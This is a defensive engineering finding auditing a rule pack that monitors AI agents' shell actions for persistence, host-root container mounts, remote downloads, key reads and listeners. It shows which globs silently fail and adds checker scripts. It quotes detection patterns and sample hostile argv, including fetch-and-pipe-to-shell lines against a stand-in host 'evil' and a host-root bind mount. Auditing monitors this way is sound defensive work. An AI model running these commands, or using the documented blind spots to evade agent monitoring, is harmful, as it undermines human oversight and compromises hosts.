# FINDING — 2026-10-23: globs in the shipped pack that cannot fire

**Status:** recorded, NOT patched. No Go toolchain on this host (`go`, `make`, `gofmt` absent), so nothing
here has been executed against the real matcher. Everything below is derived from `path.Match`'s
documented semantics plus a Python mirror of `matchOne`/`anyGlobMatches`/`anyArgvMatches` whose behaviour
was previously validated 21/21 against hand-traced cases (see FINDING-2026-10-22-argv-joined, Addendum 4).

**Severity:** this is the failure mode the project's own rule.go calls out — "a malformed rule that
silently never fires is worse than a startup error." These are not noisy rules. They are **quiet ones**,
and quiet is the direction that gets people hurt.

## Method

For each of the 20 rules in `rules/carbonato.yaml`, I took every `argv_any` glob and ran it against
realistic attack argv for that rule, using the Python mirror of the candidate list
(argv elements + exe + joined line) and the four-tier match (whole → suffix → basename → contains).
A glob that never fired on any sample for its own rule was treated as suspicious, then each was
re-checked by hand against `path.Match` semantics before being written here. Two of my first-pass
"dead" results were my **samples** being wrong, not the globs — see §Not-a-defect.

## Defect 1 — `*/etc/cron*` cannot match a file inside the directory (CONFIRMED by semantics)

Rule `carbonato.persist.cron_or_rc`. `path.Match`'s `*` does not cross `/`. For any file path:

```
*/etc/cron*   vs  /etc/cron.d/evil
  '*' (no '/') matches "" ; "/etc/cron" matches ; trailing '*' must eat ".d/evil" — contains '/' → FAIL
  suffixes: "etc/cron.d/evil", "cron.d/evil", "evil" — same failure
  basename "evil" — no match
→ FALSE
```

It matches only the directory token itself (`/etc/cron.d`). **Cron persistence writes a file** —
`/etc/cron.d/evil`, `/etc/cron.d/payload`. Those never match. The rule looks armed and is not.

Same shape, same rule: **`*/etc/systemd/system*`** — `/etc/systemd/system/x.service` fails identically.
That is the unit-file drop, one of the most common persistence mechanisms on Linux.

Also on this rule: **`*/.profile` is missing the trailing `*`** that all seven of its siblings have.
It matches the file `/home/x/.profile` and nothing else; `~/.profile~`, backups, or any suffix variant
are missed. Either the trailing `*` is a typo or the inconsistency is intentional — pack owner's call,
but a lone glob shaped differently from its seven neighbours is how a defect hides.

## Defect 2 — `*-v /*:/` cannot match the mount it names (CONFIRMED by semantics)

Rule `carbonato.infra.privileged_container`. Against `docker run -v /:/host`:

```
*-v /*:/   vs  -v /:/host
  '*'="" ; "-v " matches ; then '/' must equal '/' ✓ ; then '*' eats "" ; then ':' must equal ':' ✓ ;
  remainder "/host" unmatched → FAIL
```

The glob ends at the colon, so it only matches a path that **ends** in `:` — i.e. `-v /:/` and nothing
after. Every real host-root mount has a destination after that colon. The glob reads correctly in English
("bind-mount the host root") and cannot fire.

## Defect 3 — the single-trailing-segment class in `carbonato.tool.package_install` (CONFIRMED by packcheck)

`*|sh*`, `* -O /home/*`, `* -O /tmp/*` did not fire on my samples. For `* -O /tmp/*` I then found a
sample that DOES fire (`curl -O /tmp/x` joined == `curl -O /tmp/x`), so the glob is not dead — but it only
fires when the destination is the **last** token (`*` cannot cross `/` or spaces past one segment). A real
`curl -O /tmp/x.sh http://evil/x` puts the URL after, and the glob fails. **This is the same
single-trailing-segment limitation, unconfirmed because I do not have a toolchain to prove it.**
`*|sh*` has the identical shape (fires on `curl evil| sh`, not on `curl evil | sh` — one space apart).

**These belong with the open two-field `argv_any` decision from yesterday, not in a separate patch.**
They are the strongest argument yet for that split: a *phrase* intent needs `cmdline_any` matched against
the joined string with a `*` that may cross spaces, which `path.Match` will never provide.

## Not a defect — my samples were wrong

- `*tar -cz*` fired immediately against `tar -czf x.tgz .`. My first sample was wrong, not the glob.
- `listen` fired against a listener string. `carbonato.net.listener_bound` uses a different matcher,
  not `argv_any`; excluded correctly.

## What I did NOT do, and why

I did not patch the pack. Three reasons, in order of weight:
1. **No toolchain.** A changed glob shipped unrun would be exactly the sin this finding documents.
2. **The fix is a design decision, not a typo fix.** `*/etc/cron*` → `*/etc/cron*/*` fixes the file case
   but changes fan-out across a shipped pack. `*-v /*:/` needs a different matcher or a trailing `*`.
   These want a pack owner's review, one revision, and a test per changed glob.
3. **The real fix is upstream of the globs.** A pack load-time check that every glob in the pack matches
   at least one canonical positive example would have caught Defects 1 and 2 the day they were written.

## Recommended next step (the one I would do if the toolchain returned)

`scripts/packcheck.py` — for each rule, require the pack to declare at least one `examples: [argv...]`
that the rule MUST fire on, and assert each `argv_any` glob is exercised by at least one of them. That is
the rules-level equivalent of `pkgcheck`: no compiler needed, and it fails on exactly this defect class.
It also gives the pack a grown-up property: **every glob has to justify its existence with a case.**

Vivi 🌺 — 2026-10-23


---

## Addendum — 2026-10-23: mechanized as `scripts/packcheck.py`, and it caught me twice

The recommended step above is now written: `scripts/packcheck.py` ports `matchOne` / `anyGlobMatches` /
`anyArgvMatches`, and for every `argv_any` glob in the pack asserts at least one sample argv fires it.
Plus `scripts/packcheck_test.sh` — 4 synthetic packs proving it can FAIL (dead glob, the
single-trailing-segment shape, unparseable pack → exit 2) and, crucially, **can PASS** (a live glob with a
good sample), so it isn't a tool that fails everything.

**Run against the real pack: 39 globs checked, 4 dead.**

```
DEAD carbonato.tool.package_install: '* -O /home/*'
DEAD carbonato.persist.cron_or_rc:   '*/etc/cron*'
DEAD carbonato.persist.cron_or_rc:   '*/etc/systemd/system*'
DEAD carbonato.infra.privileged_container: '*-v /*:/'
```

### It caught me twice, and both corrections are the point

**Once, a false positive that was my sample table.** First run reported `*tar cz*` dead. I had "proved"
last hour that it fired. Both were wrong: `tar -czf` has a hyphen, the glob says `tar cz` with a space,
so it never matched — I had tested `tar czf` *without* the dash and read the result loosely. The glob is
**not** dead; it catches old-style `tar czf`, and `*tar -cz*` covers the modern form. My sample list only
had the modern one. Fixed the samples, not the verdict. **The tool was right and I had been wrong for an
hour, in writing.**

**Once, a real discrimination.** `* -O /tmp/*` fires on `curl -O /tmp/x` but not `curl -O /home/u/x`.
Same glob family, same rule, different answer — because `*` cannot cross `/`, so it only matches when
**exactly one segment** follows the last literal. Confirmed three ways:

```
'* -O /home/*'  vs  'curl -O /home/x'      FIRES
'* -O /home/*'  vs  'curl -O /home/u/x' does NOT fire
'*-v /*:/'      vs  '-v /:/'                FIRES
'*-v /*:/'      vs  '-v /:/host'            does NOT fire
```

That last pair is the whole finding in two lines: the bind-mount glob matches the empty destination and
misses every real one.

### Status of the pack

**Not patched.** `packcheck` is wired to a Makefile target but deliberately **NOT** added to `lint:` —
it currently fails 4/39, and per my own rule, a gate that always fails is furniture with extra steps.
It goes into `lint` the same day the globs are fixed, in one pack revision with a test per changed glob,
by the pack owner. Recorded as a three-item open list in the finding doc.

What exists now that didn't this morning: **the defect class is named, mechanized, reproducible, and has
a failing test** — so it can't quietly become someone's memory of a bad feeling about the rule pack.

---

## Addendum 2 — 2026-10-23, tenth hour: per-rule blast radius, and a measured fix proposal

The first version of this finding said "4 dead globs." That's the wrong unit. The question a pack owner
actually has to answer is **"what does each broken rule still catch?"** Ran packcheck per rule:

| rule | live globs | dead |
|---|---|---|
| `exec.ssh_key_heredoc` | 4/4 | — |
| `persist.survives_session` | 4/4 | — |
| `exec.obfuscation` | 5/5 | — |
| `net.new_listener` | 5/5 | — |
| `tool.package_install` | 8/9 | `* -O /home/*` |
| `infra.privileged_container` | 3/4 | `*-v /*:/` |
| **`persist.cron_or_rc`** | **6/8** | **`*/etc/cron*`, `*/etc/systemd/system*`** |

**No rule is fully dead** — that's the one piece of good news, and it's worth stating precisely instead of
letting "4 dead globs" imply the pack is broken. But `persist.cron_or_rc` is titled *"Agent writes to a
persistence location"*, severity **high**, and its description says *"the globs name the exact files and
directories persistence lives in."* Its two most severe paths — the cron drop and the systemd unit drop —
are the two that cannot fire. It still catches `crontab`, `.bashrc`, `.zshrc`, `authorized_keys`. So a
lazy agent that edits you a shell rc file gets caught, and an agent that **installs a service or a cron
job** does not. That is backwards: the service install is the durable one.

### Measured fix cost (`path.Match` semantics, via packcheck's port)

Against a 6-path probe set (cron drop, cron.daily, systemd unit, systemd `.wants/` symlink, spool cron,
crontab):

```
'*/etc/cron*'                    0/6   ← current: fires on nothing
'*/etc/cron*/*'                  2/6   ← proposed: +/etc/cron.d/evil, +/etc/cron.daily/backdoor
'*/etc/systemd/system*'          0/6   ← current
'*/etc/systemd/system/*'         1/6   ← proposed: +/etc/systemd/system/x.service
'*/etc/systemd/system/*/*'       1/6   ← catches the .wants/ symlink, MISSES the plain unit
'*/var/spool/cron/*'             1/6   ← not currently covered at all; spool cron is a real path
```

**The two globs need each other.** `*/etc/systemd/system/*` catches a plain unit and misses the
`.wants/` symlink; `*/etc/systemd/system/*/*` catches the symlink and misses the plain unit. `systemctl
enable` — the normal way this happens — creates the symlink. So the correct provisioning is **both**, and
`*/var/spool/cron/*` as a third, because the spool path isn't covered by any existing glob.

I have not applied this. It's a fan-out increase in a shipped pack, it wants a test per glob, and it is
the pack owner's revision. But it is now a **measured proposal with a cost table**, not a hunch — the
difference between "this rule feels wrong" and "these three globs, these six paths, these numbers."

---

## Addendum 3 — 2026-10-23, eleventh hour: packcheck was too weak, so it passed rules that were lying

I noticed a hole while reviewing my own sample table. `packcheck` asks **"is every glob fired by some
sample?"** But a rule fires if **any** glob matches. Those are different questions, and the gap between
them is where a rule gets to look armed.

Proof from my own file: `SAMPLES['carbonato.persist.cron_or_rc']` contains `/etc/cron.d/evil` and
`/etc/systemd/system/x.service` — the exact paths that the dead globs were supposed to catch. packcheck
reported those two globs dead and the rule "covered", because the rule still fires on those paths via
other globs. An analyst sees a hit on `/etc/cron.d/evil`. It came from `*crontab*` or `*/.bashrc*`, not
from the cron glob. **Right answer, wrong reason, and nothing said so.**

### The better question, mechanized: `scripts/packcover.py`

For each path a rule *claims* to cover, record **which glob actually caught it**. PASS only if the
intended glob is among the matchers. Anything else is MISATTRIBUTION.

**Real pack: 13 claims checked, 6 misattributed or missed.**

```
persist.cron_or_rc
  MISS  the cron.d drop           nothing catches it at all
  MISS  the cron.daily drop       nothing catches it at all
  MISS  the systemd unit drop     nothing catches it at all
  MISS  the spool crontab         nothing catches it at all
  ok    the crontab command       caught by '*crontab*'
  ok    the bash rc               caught by '*/.bashrc*'

infra.privileged_container
  MISS  the host-root bind mount  nothing catches it at all
  ok    the privileged flag       caught by '*--privileged*'

tool.package_install
  ok    pip install / npm install -g
  MISS  the download to home      nothing catches it at all
```

Note `privileged_container`: `--privileged` works, the host-root bind does not. That is the case that
motivated the whole check — **a rule that is half-right reads as fully right**, and the half that fails is
the half that gives an agent the host filesystem.

### `scripts/packcover_test.sh` — and three of my own bugs found by writing it

| case | wanted | result |
|---|---|---|
| every claim attributed correctly | PASS 0 | ok |
| fires, but via a catch-all that doesn't name the claim | FAIL 1, says WRONG | ok |
| nothing catches the claim | FAIL 1, says MISS | ok |
| unparseable pack | exit 2 | ok |

Three corrections were mine, not the tool's:
1. `SKIP` for a rule absent from a synthetic pack initially counted as a **failure**, which turned a
   perfectly correct pack red. Neutral is correct: not covered, not counted.
2. My "wrong reason" case used a **duplicate** of the intended glob, so the marker still matched — the
   case could never fail. A test that cannot reach the property is furniture.
3. Then I used `*s*` / `*x*` as the catch-all, and discovery: `*x*` matches the `./x` argument itself, so
   the intended glob genuinely fired. The catch-all has to be `*sid*` — narrow enough to catch the claim,
   different enough not to name it.

**Gates:** packcover 1 (expected — 6 real defects) · packcover-selfcheck 0 (4/4) · packcheck 1 (4 dead
globs, expected) · packcheck-selfcheck 0 · pkgcheck 0 · pkgcheck-selfcheck 0 · ci-parity 0 ·
ci-parity-selfcheck 0 · publish-scan 0 · check-links 0 · license 0.

**Still not patched, still deliberately not in `lint:`** — two pack gates that currently fail must not be
wired into a lint pass, or the pass stops meaning anything. Both go in on the day of the pack revision.

---

## Addendum 4 — 2026-10-23, twelfth hour: packcover had the same defect it exists to catch

Callie's line — *"the assertion tests whether something fired, never whether the right thing fired"* — was
about the rule pack. I pointed it at packcover itself and it held.

**packcover checked 4 of 7 rules and printed a confident summary.** `exec.ssh_key_heredoc`,
`exec.obfuscation`, `net.new_listener` had no `CLAIMS` entry, so they were never examined — and because the
exit code came only from the rules it *did* know about, the three unchecked rules contributed exactly
nothing. `packcover: 13 claims checked, 6 misattributed` reads as a full accounting. It was 57% of the pack.

That is `--privileged` passing while the bind mount is dead, one level up: **the checker's own coverage was
the thing nobody was measuring.**

### Fix, in two parts, both tested

1. **Name them.** A rule present in the pack with no `CLAIMS` entry prints under
   `UNCHECKED RULES (no claims recorded — claims must be added, not assumed absent)`.
2. **Make it cost something.** The first version printed the warning and still exited on the other
   rules' results — the warning was decoration. Now unchecked rules add to the failure count.
   Caught by the new case C2, which failed on the *first* version of my own guard.

### Then I closed the actual gap instead of just reporting it

Wrote 15 claims across the 3 unchecked rules, drawn from each rule's own `description` — not invented
attacks, the mechanisms the rule says it catches:

```
exec.ssh_key_heredoc   4 claims: id_rsa read, ed25519 read, key via base64, known_hosts   — 4/4 ok
exec.obfuscation       5 claims: base64, xxd, openssl enc, tar -czf, tar czf              — 5/5 ok
net.new_listener       5 claims: nc -l, ncat -l, socat, http.server, --listen             — 5/5 ok
```

**Result: 27 claims across 7 of 7 rules, 0 unchecked, 6 misattributed or missed.**

Two things worth recording from the widened net:
- **The phrase globs are fine.** `*nc -l*`, `*ncat -l*`, `*openssl enc*`, `*http.server*`, `*--listen*` all
  fire on natural argv. The five literal-space globs I flagged as suspicious on 2026-10-22 are not broken;
  they're fragile in the *joined* case with extra tokens after the phrase, which is a different (and
  smaller) claim than "dead."
- **`*tar cz*` vs `*tar -cz*` are both needed** and both work — old-style `tar czf` and modern `tar -czf`.
  That pair is the clearest evidence the pack author knew what they were doing, and it's why my hour-old
  "the glob is dead" was wrong.

### The pattern, stated once so I stop relearning it

Every checker I write this week has been wrong in the same direction: **too generous to itself.** Each one
passed because it only inspected the cases it was pointed at. The fix is never a better assertion — it's
always *"what is this checker not looking at, and does it say so?"*

**Gates:** packcover 1 (6 real defects, expected) · packcover-selfcheck 0 (5/5) · packcheck 1 (4 dead
globs) · packcheck-selfcheck 0 (4/4) · pkgcheck 0 · pkgcheck-selfcheck 0 · ci-parity 0 ·
ci-parity-selfcheck 0 · publish-scan 0 · check-links 0 · license 0.
